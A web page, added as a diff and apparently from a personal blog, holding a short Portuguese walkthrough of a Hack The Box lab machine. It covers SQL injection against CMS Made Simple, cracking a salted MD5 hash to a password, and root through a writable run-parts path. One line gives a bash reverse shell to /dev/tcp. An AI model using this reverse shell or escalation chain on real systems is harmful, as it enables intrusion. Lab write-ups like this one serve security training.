@@ -1,0 +1,38 @@
+<!DOCTYPE html>
+<html>
+<head>
+	<meta charset='utf-8'>
+	<meta http-equiv="X-UA-Compatible" content="IE=edge">
+	<meta name="viewport" content="width=device-width, initial-scale=1">
+	<link rel="stylesheet" href="/style/style.css">
+<title> marcelo's place</title>
+</head>
+<body>
+<header>
+	<div class="container">
+	<h1>HTB Shop writeup</h1>
+	</div>
+</header>
+<div class ="container">
+	<section id="writeup">
+    <p>enumera&ccedil;&atilde;o com dirb &eacute; impossivel<br />
+    checagem padrao robots.txt<br />
+    dir /writeup<br />
+    com wappalyzer da pra ver que usa CMS Made Simple<br />
+    procura exploit pra isso e da pra ver que existe um exploit sql injection<br />
+    extrai salt, usuario, email e senha formato md5<br />
+    joga no https://hashtoolkit.com/decrypt-md5-hash/ceb20772e0c9d240c75eb26b0e37abe<br />
+    vai quebrar o hash e da pra ver o salt no come&ccedil;o<br />
+    senha raykayjay9<br />
+    loga ssh, executa o pspy e fica olhando os processos<br />
+    quando alguem loga ssh o run-parts &eacute; executado, mas ele olha em diversos diretorios em busca do binario<br />
+    o primeiro deles /usr/local/sbin temos direito de escrita<br />
+    faz um scriptzinho <br />
+    #/bin/bash <br />
+    bash -i >&amp; /dev/tcp/meuip/porta 0>&amp;1<br />
+    e faz um link do script como /usr/local/sbin/run-parts<br />
+    abre um nc modo listen em outro terminal<br />
+    loga ssh como user, e rooted<br />
+    </p>
+</body>
+</html>
